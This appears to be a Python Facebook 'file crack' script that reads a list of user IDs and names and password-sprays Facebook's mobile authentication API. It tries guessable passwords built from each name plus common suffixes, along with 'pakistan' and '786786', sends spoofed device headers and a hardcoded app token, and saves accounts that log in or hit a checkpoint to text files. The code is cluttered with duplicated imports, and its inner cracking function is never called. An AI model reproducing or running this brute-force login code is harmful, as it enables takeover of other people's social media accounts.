#coding=utf-8
#!/usr/bin/python2
#coding=utf-8
#originally written by javed Iqbal sad boy


#ADMIN NOTICE
#YE SC LOCAL HAI OR SAHI WORK NHI KRTA
#AGER AP BIGNER HAIN TU EDIT KR K 
#APNA KAM CHALA LO
# IF YOU NEED REAL SCRIPT CONT: +923422008140


# run by python or ./
################
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
try: import requests
except ModuleNotFoundError: os.system("python -m pip install requests &> /dev/null")
try: import bs4
except ModuleNotFoundError: os.system("python -m pip install bs4 &> /dev/null")
try: import mechanize
except ModuleNotFoundError: os.system("python -m pip install mechanize &> /dev/null")
import requests as req
#import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,urlopen
#from multiprocessing.pool import ThreadPool

####### 1
try:
        import requests
except ImportError:
        print ('[×] Modul requests belum terinstall!...\n')
        os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
import requests
import uuid
import ipaddress
import calendar
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as par
from time import sleep
from datetime import datetime
from datetime import date
import requests,mechanize,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
import os, re, requests, concurrent.futures
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
import requests as r, re, os
from bs4 import BeautifulSoup as par
import platform
import requests, bs4, sys, os, subprocess, random, time, re, json
import concurrent.futures
from datetime import datetime
from time import sleep
from requests import Session
import re, sys
import sys
from os import system
import os, sys, time, random
from sys import exit as keluar
from time import sleep as waktu
from random import random as acak
from random import choice as pilih
from sys import stdout
from os import system
import re
import os,random,time,sys
import json
from time import sleep as waktu
from bs4 import BeautifulSoup as parser
current = datetime.now()
import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json
koneksi_error=(req.exceptions.ConnectionError,req.exceptions.ChunkedEncodingError,req.exceptions.ReadTimeout)

#### 2
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote

#### 3
import requests, sys, bs4, os, random, time, re, json
from concurrent.futures import ThreadPoolExecutor as zthreads
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from datetime import datetime
from time import sleep

### 4
try:
        import concurrent.futures
except ImportError:
        print("\n [!] \033[0;91mmodule futures belum terinstall\033[0;97m")
        os.system("pip install futures")

import os
import sys
import time
import requests
import random
from concurrent.futures import ThreadPoolExecutor

#### 5
ua = {"user-agent":"chrome"}
prvt = []
ses = r.Session()
link = "https://free.facebook.com/"
r=requests.Session()
host="https://mbasic.facebook.com"
ips=None
try:
        ipx=requests.get("http://ip-api.com/json/").json()["query"]
        ips=requests.get("http://ip-api.com/json/"+ipx,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country"].lower()
        ipp = requests.get("https://api.ipify.org").text
        country=requests.get("http://ip-api.com/json/").json()["country"]
except:
        ips=None
        ipx=("NONE")

	###### 6
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21','22',]

url="https://free.facebook.com"
useragent="Mozilla/5.0 (Linux; Android 5.1; PICOphone_M4U_M2_M Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36"

  ###### 7
agents = [
    'Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996']
birth = [
    '001',
    '02',
    '03',
    '04',
    '05',
    '06',
    '07',
    '08',
    '09',
    '10',
    '11',
    '12',
    '13',
    '14',
    '15',
    '16',
    '17',
    '18',
    '19',
    '20',
    '21']
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3',
    'x-fb-connection-type': 'unknown',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }

###########  8
headers = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
bxbuser = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': bxbuser, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
fuck = []
idx = []
oks = []
cps = []


os.system('clear')
##### LOGO #####
id = []
oks = []
cps = []
logo = "\n\x1b[1;92m#########\x1b[1;93m   ##         ##\x1b[1;92m #########\n\x1b[1;92m##        ## \x1b[1;93m##       ##\x1b[1;92m ##        ##\n\x1b[1;92m##        ##  \x1b[1;93m##     ##\x1b[1;92m  ##        ##\n\x1b[1;92m##        ##\x1b[1;93m   ##   ##\x1b[1;92m   ##        ##\n\x1b[1;92m##########      \x1b[1;93m## ##   \x1b[1;92m ##########\n\x1b[1;92m##        ##\x1b[1;93m    # ##     \x1b[1;92m##        ##\n\x1b[1;92m##        ##\x1b[1;93m   ##   ##   \x1b[1;92m##        ##\n\x1b[1;92m##        ## \x1b[1;93m ##     ##\x1b[1;92m  ##        ##\n\x1b[1;92m##########  \x1b[1;93m##         ## \x1b[1;92m##########\n\x1b[1;95m_______________________________________\n\x1b[1;96m|Author   | \x1b[1;93mJaved Iqbal (Sad-Boy)      |\n\x1b[1;96m|Fb Id    | \x1b[1;93mJaved Iqbal Sad Boy        |\n\x1b[1;96m|GitHub   | \x1b[1;93mBALOOXH-BRAND              |             \n\x1b[1;95m|______________________________________|\n \x1b[1;92m"
host : ('mbasic.Facebook.com')
def main():
    os.system("clear")
    print (logo)
    print(47*".")
    print("\x1b[1;98m [1] File Crack")
    print(" \x1b[1;98m[2] Auto Help ")
    print(" \x1b[1;98m[3] Help From Owner")
    print(" \x1b[1;98m[4] Exit")
    print(47*".")
    log_sel()
def log_sel():
	sel = input(" Choose an option: ")
	if sel =="1":
		file_crack()
	elif sel =="2":
		help()
	elif sel =="3":
		hlp()
def file_crack():
    os.system('clear')
    print( logo)
    print ('')
    print( '')
    try:
        mf = input('[!] Enter path : ')
        print( '')
        for line in open(mf, 'r').readlines():
            idx.append(line.strip())

    except:
        
        print( 'file not found')
        time.sleep(2)
        file_crack()
        
    print( "[!] total ids : "+str(len(idx)))
    os.system('echo " -----------------------------------"| lolcat')
    print( "    Cracking Start Please Wait ..")
    print( "    Use Flight Mod For For Speed Up")
    os.system('echo " -----------------------------------"| lolcat')
    
    
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        ranagent = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({
            'User-Agent': ranagent })
        os.system ("update header")
        try:
            pass1 = name.lower() + '123'
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
            q = json.loads(data)
            if 'access_token' in q:
                print( '\x1b[1;92m[BXB-OK] ' + uid + ' | ' + pass1 + ' | ' + name)
                ok = open('bxbok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print( '\x1b[1;93m[BXB-CP] ' + uid + ' | ' + pass1 + ' | ' + name)
                cp = open('bxbcp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print ('\x1b[1;92m[BXB-OK] ' + uid + ' | ' + pass2 + ' | ' + name)
                    ok = open('bxbok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print( '\x1b[1;93m[BXB-CP] ' + uid + ' | ' + pass2 + ' | ' + name)
                    cp = open('bxbcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '12345'
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print ('\x1b[1;92m[BXB-OK] ' + uid + ' | ' + pass3 + ' | ' + name)
                        ok = open('bxbok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ('\x1b[1;93m[BXB-CP] ' + uid + ' | ' + pass3 + ' | ' + name)
                        cp = open('bxbcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '786'
                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print ('\x1b[1;92m[BXB-OK] ' + uid + ' | ' + pass4 + ' | ' + name)
                            ok = open('bxbok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ('\x1b[1;93m[BXB-CP] ' + uid + ' | ' + pass4 + ' | ' + name)
                            cp = open('bxbcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            pass5 = '786786'
                            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print ('\x1b[1;92m[BXB-OK] ' + uid + ' | ' + pass5 + ' | ' + name)
                                ok = open('bxbok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print( '\x1b[1;93m[BXB-CP] ' + uid + ' | ' + pass5 + ' | ' + name)
                                cp = open('bxbcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                pass6 = 'pakistan'
                                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass6 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print( '\x1b[1;92m[BXB-OK] ' + uid + ' | ' + pass6 + ' | ' + name)
                                    ok = open('bxbok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print ('\x1b[1;93m[BXB-CP] ' + uid + ' | ' + pass6 + ' | ' + name)
                                    cp = open('bxbcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    pass7 = 'pakistan123'
                                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass7 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print( '\x1b[1;92m[BXB-OK] ' + uid + ' | ' + pass7 + ' | ' + name)
                                        ok = open('bxbok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print ('\x1b[1;93m[BXB-CP] ' + uid + ' | ' + pass7 + ' | ' + name)
                                        cp = open('bxbcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass
        


    
    
    print( '')
    print( '')
    print (54 * '\x1b[1;92m_')
    print ('')
    print( ' \x1b[1;92mThe process has been completed')
    print( ' \x1b[1;92mTotal Ok/Cp: ' + str(len(oks)) + '/' + str(len(cps)))
    print( ' \x1b[1;92mNote: Clone Account Saved Sdcard Folder: bxbcp.txt')
    print (54 * '_')
    print( '')
    print( '')
    input(' \x1b[1;93m Press enter to back ')
    file_crack()




    
def hlp():
    os.system('xdg-open https://wa.me/+923422008140')
    main()
os.system ('git pull')
if __name__ == '__main__':
	main()
 
 